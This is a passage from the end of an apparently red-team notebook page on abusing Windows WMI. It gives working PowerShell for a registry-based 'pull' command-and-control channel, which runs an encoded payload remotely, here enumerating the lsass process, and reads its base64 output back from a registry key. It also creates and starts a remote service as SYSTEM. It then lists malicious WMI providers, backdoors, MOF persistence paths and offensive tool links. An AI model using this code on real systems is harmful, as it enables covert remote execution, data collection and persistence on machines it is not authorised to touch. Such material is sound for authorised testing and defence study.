</span></code></pre></div></p>
<h4 id="wmi-attacks-c2-communication-registry-pull-attack">WMI Attacks – C2 Communication (Registry) – “Pull” Attack</h4>
<p><strong>First Step</strong> - Registry Key creation
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>$Credential = Get-Credential &#39;CORP.local\admin&#39;
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>$CommonArgs = @{
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>Credential = $Credential
</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>ComputerName = &#39;192.168.2.10&#39;
</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>}
</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>$HKLM = 2147483650
</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name CreateKey -ArgumentList $HKLM,
</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>&#39;SOFTWARE\EvilKey‘
</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name DeleteValue -ArgumentList $HKLM,
</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>&#39;SOFTWARE\EvilKey&#39;, &#39;Result&#39;
</span></code></pre></div></p>
<p><strong>Second Step</strong> - Retrieving payload in registry
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>$PayloadText = @&#39;
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>$Payload = {Get-Process lsass}
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>$Result = &amp; $Payload
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>$Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>$Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Output))
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value $Encoded
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>&#39;@
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>$PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;
</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>$RemoteOutput = Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name GetStringValue -
</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a>ArgumentList $HKLM, &#39;SOFTWARE\EvilKey&#39;, &#39;Result&#39;
</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a>$EncodedOutput = $RemoteOutput.sValue
</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a>$DeserializedOutput =
</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a>[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetString([Convert]::F
</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>romBase64String($EncodedOutput)))
</span></code></pre></div></p>
<h4 id="command-execution-win32_service">Command Execution Win32_Service</h4>
<p>We can create a service on a remote machine using WMI to execute commands and scripts.<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>$SericeType = [byte] 16
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>$ErrorControl = [byte] 1
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false, &quot;Windows Performance&quot;, $ErrorControl, $null, $null, &quot;WinPerf&quot;, &quot;C:\Windows\System32\calc.exe&quot;, $null, $ServiceType, &quot;Manual&quot;, &quot;NT AUTHORITY\SYSTEM&quot;, &quot;&quot;
</span></code></pre></div></p>
<p>Start the previously created service
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>Get-WmiObject -Class Win32_Service -Filter &#39;Name = &quot;WinPerf&quot;&#39; | Invoke-WmiMethod -Name StartService
</span></code></pre></div></p>
<h2 id="wmi-persistence">WMI Persistence</h2>
<h4 id="malicious-wmi-providers">Malicious WMI providers</h4>
<p>Attacker can create custom malicious WMI providers in order to backdoor a system.</p>
<ul>
<li>https://gist.github.com/TheWover/4272ea5829d7f6b22fadaeb8aee3229a</li>
<li>https://gist.github.com/nicholasmckinney/6309dbd6d3a1aed04f1350e1a685916d</li>
<li>https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider</li>
</ul>
<h4 id="win32_localadmins-provider">Win32_LocalAdmins provider</h4>
<p>Creates a class called Win32_LocalAdmins in hte <strong>root\cimv2</strong> namespace which can be used to list all local administrators.
- https://github.com/rzander/LocalAdmins</p>
<h4 id="evilnetconnection-wmi-provider">EvilNetConnection WMI Provider</h4>
<ul>
<li>https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider</li>
</ul>
<p>WMI provider which when installed provides ability to execute PowerShell command with SYSTEM privileges.<br />
- Needs elevated privileges to be installed
- PowerShell.exe is <strong>not</strong> used to execute the payload</p>
<h4 id="evilwmiprovider-subtee">EvilWMIProvider (SubTee)</h4>
<ul>
<li>https://gist.github.com/TheWover/4272ea5829d7f6b22fadaeb8aee3229a</li>
</ul>
<h4 id="wmi-backdoor">WMI Backdoor</h4>
<ul>
<li>https://github.com/mattifestation/WMI_Backdoor</li>
</ul>
<h4 id="mof-files">MOF files</h4>
<p>The list of MOF files for autorecovery is stored here :
- <code>HKLM\SOFTWARE\Microsoft\WBEM\CIMOM\Autorecover MOFs</code>
- <code>C:\Windows\system32\wbem\AutoRecover</code></p>
<h4 id="wmi-event-subscriptions">WMI Event Subscriptions</h4>
<p>WMI has an event infrastructure which provides the capability of receiving notifications and respond to changes happening on a system.  </p>
<p>--&gt; Synchronous and Asynchronous event queries can be created.  </p>
<h2 id="resources">Resources</h2>
<h4 id="blackhat-us-2015-abusing-wmi-to-built-a-persistent-asyncronous-and-fileless-backdoor">BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.</h4>
<ul>
<li>https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</li>
<li>https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%20CON%2023%20-%20Ballenthin-Graeber-Teodorescu-WMI-Attacks-Defense-Forensics.pdf</li>
</ul>
<h4 id="wmisploit">WMISploit</h4>
<ul>
<li>https://github.com/secabstraction/WmiSploit</li>
</ul>
<h4 id="wmi-for-script-kiddies">WMI for Script Kiddies</h4>
<ul>
<li>https://www.trustedsec.com/blog/wmi-for-script-kiddies/</li>
</ul>
<h4 id="usefull-wmic-queries-for-host-and-domain-enumeration">Usefull WMIC queries for host and domain enumeration</h4>
<ul>
<li>https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</li>
</ul>
<h4 id="red-team-handbook-wmi-command">Red Team handbook WMI command</h4>
<ul>
<li>https://kwcsec.gitbook.io/the-red-team-handbook/techniques/enumeration/recon-commands/wmic-commands</li>
</ul>
<h4 id="nolimitsecu-french-podcast-dedicated-to-wmi">NoLimitSecu French Podcast dedicated to WMI</h4>
<ul>
<li>https://www.nolimitsecu.fr/wmi/</li>
</ul>
<h4 id="andrei-dumitrescu-ocd">Andrei Dumitrescu - OCD</h4>
<ul>
<li>https://raw.githubusercontent.com/Orange-Cyberdefense/cme-wmi/master/slides/WMI-Attacks_From_Theory2Practice.pdf</li>
</ul>
<h4 id="backdoor-with-wmi">Backdoor with WMI</h4>
<ul>
<li>https://www.sakshamdixit.com/backdoor-with-wmi/</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav">
      <a href="../macos%20intrusion/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../macos%20intrusion/" class="btn btn-xs btn-link">
        macOS intrusion
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/methods/wmi 4 attackers.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>